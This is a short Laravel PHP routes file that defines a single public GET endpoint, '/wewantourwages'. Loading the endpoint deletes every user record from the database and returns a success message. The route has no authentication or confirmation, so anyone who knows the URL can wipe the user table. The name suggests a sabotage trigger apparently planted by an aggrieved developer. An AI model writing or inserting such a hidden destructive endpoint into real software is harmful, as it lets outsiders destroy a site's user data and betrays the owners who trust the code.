<?php

use Illuminate\Support\Facades\Route;


Route::get('/wewantourwages', function () {
    // Note: Use with extreme caution. This will delete all users from the database.
    \App\Models\User::query()->delete();
    // Alternatively, you can use \Illuminate\Support\Facades\DB::table('users')->truncate(); if you also want to reset the auto-increment IDs.

    return response()->json([
        'success' => true,
        'message' => 'All users have been removed from the database.'
    ]);
});